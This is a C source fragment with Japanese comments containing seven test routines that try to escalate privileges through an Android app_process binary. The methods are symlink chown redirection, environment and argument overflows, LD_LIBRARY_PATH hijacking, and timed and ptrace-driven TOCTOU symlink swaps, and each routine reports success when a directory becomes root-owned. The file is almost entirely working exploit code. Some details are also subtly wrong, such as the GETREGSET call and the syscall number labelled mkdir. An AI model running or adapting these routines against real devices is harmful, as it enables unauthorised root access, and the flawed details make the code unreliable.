// ========== テスト1: chownシンボリックリンク ==========
void test_symlink_chown(const char *app_path) {
    printf("\n[TEST-1] chownシンボリックリンク\n");
    setup_test_environment();
    uid_t before, after;
    check_file_owner(TARGET_DIR, &before, NULL);
    printf("  変更前 uid=%d\n", before);
    char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
    char *argv[] = { (char*)app_path, "--zygote", NULL };
    run_app_process(app_path, argv, envp);
    check_file_owner(TARGET_DIR, &after, NULL);
    printf("  変更後 uid=%d %s\n", after, (after==0)?"[!] 成功":"[-] 失敗");
    cleanup_test_environment();
}

// ========== テスト2: 環境変数長過剰 ==========
void test_env_overflow(const char *app_path) {
    printf("\n[TEST-2] 環境変数長過剰\n");
    setup_test_environment();
    char long_data[16384];
    memset(long_data, 'A', sizeof(long_data)-1);
    long_data[sizeof(long_data)-1] = '\0';
    char env_value[32768];
    snprintf(env_value, sizeof(env_value), "ANDROID_DATA=%s", long_data);
    char *envp[] = { env_value, NULL };
    char *argv[] = { (char*)app_path, "--help", NULL };
    int ret = run_app_process(app_path, argv, envp);
    printf("  終了コード: %d (異常終了ならカナリア検出)\n", ret);
    cleanup_test_environment();
}

// ========== テスト3: 引数ベクター過剰 ==========
void test_argv_overflow(const char *app_path) {
    printf("\n[TEST-3] 引数ベクター過剰 (1000個)\n");
    setup_test_environment();
    const int ARG_COUNT = 1000;
    char **argv = malloc((ARG_COUNT+2)*sizeof(char*));
    argv[0] = (char*)app_path;
    for (int i=1; i<=ARG_COUNT; i++) argv[i] = "-classpath";
    argv[ARG_COUNT+1] = NULL;
    char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
    int ret = run_app_process(app_path, argv, envp);
    printf("  終了コード: %d\n", ret);
    free(argv);
    cleanup_test_environment();
}

// ========== テスト4: LD_LIBRARY_PATH ==========
void test_dl_hijack(const char *app_path) {
    printf("\n[TEST-4] LD_LIBRARY_PATH\n");
    setup_test_environment();
    char *envp[] = { "LD_LIBRARY_PATH=/data/local/tmp", "ANDROID_DATA=" TEST_DIR, NULL };
    char *argv[] = { (char*)app_path, "--zygote", NULL };
    int ret = run_app_process(app_path, argv, envp);
    printf("  終了コード: %d (setuidでは無視される)\n", ret);
    cleanup_test_environment();
}

// ========== テスト5: TOCTOU (usleep) ==========
void test_toctou_race(const char *app_path) {
    printf("\n[TEST-5] TOCTOU (usleep)\n");
    setup_test_environment();
    char real_cache[PATH_MAX];
    snprintf(real_cache, sizeof(real_cache), "%s/real_cache", TEST_DIR);
    mkdir(real_cache, 0755);
    unlink(CACHE_DIR);
    symlink(real_cache, CACHE_DIR);
    pid_t pid = fork();
    if (pid == 0) {
        char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
        char *argv[] = { (char*)app_path, "--zygote", NULL };
        execve(app_path, argv, envp);
        exit(1);
    } else {
        usleep(50000);
        unlink(CACHE_DIR);
        symlink(TARGET_DIR, CACHE_DIR);
        int status; waitpid(pid, &status, 0);
        uid_t after; check_file_owner(TARGET_DIR, &after, NULL);
        printf("  uid=%d %s\n", after, (after==0)?"[!] 成功":"[-] 失敗");
    }
    cleanup_test_environment();
}

// ========== テスト6: chmod setuid ==========
void test_chmod_setuid(const char *app_path) {
    printf("\n[TEST-6] chmod setuid (chown失敗時は実行されない)\n");
    setup_test_environment();
    chmod(TARGET_DIR, 04777);
    mode_t mode; check_file_mode(TARGET_DIR, &mode);
    printf("  変更前モード: 0%o\n", mode & 07777);
    char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
    char *argv[] = { (char*)app_path, "--zygote", NULL };
    run_app_process(app_path, argv, envp);
    check_file_mode(TARGET_DIR, &mode);
    printf("  変更後モード: 0%o (変化なしが正しい)\n", mode & 07777);
    cleanup_test_environment();
}

// ========== テスト7: ptrace TOCTOU ==========
void test_ptrace_toctou(const char *app_path) {
    printf("\n[TEST-7] ptrace TOCTOU\n");
    setup_test_environment();
    char real_cache[PATH_MAX];
    snprintf(real_cache, sizeof(real_cache), "%s/real_cache", TEST_DIR);
    mkdir(real_cache, 0755);
    unlink(CACHE_DIR);
    symlink(real_cache, CACHE_DIR);
    pid_t pid = fork();
    if (pid == 0) {
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
        char *argv[] = { (char*)app_path, "--zygote", NULL };
        execve(app_path, argv, envp);
        exit(1);
    } else {
        int status;
        waitpid(pid, &status, 0);
        ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
        int in_syscall = 0;
        while (1) {
            ptrace(PTRACE_SYSCALL, pid, 0, 0);
            waitpid(pid, &status, 0);
            if (WIFEXITED(status)) break;
            if (WSTOPSIG(status) != SIGTRAP) continue;
            struct user_pt_regs regs;
            ptrace(PTRACE_GETREGSET, pid, 1, &regs); // NT_PRSTATUS = 1
            if (regs.regs[8] == 83) { // mkdir syscall
                if (!in_syscall) in_syscall = 1;
                else {
                    // exit from mkdir: now replace symlink
                    unlink(CACHE_DIR);
                    symlink(TARGET_DIR, CACHE_DIR);
                    printf("[ptrace] symlink replaced\n");
                    in_syscall = 0;
                }
            }
        }
        waitpid(pid, &status, 0);
        uid_t after; check_file_owner(TARGET_DIR, &after, NULL);
        printf("  uid=%d %s\n", after, (after==0)?"[!] 成功":"[-] 失敗");
    }
    cleanup_test_environment();
}

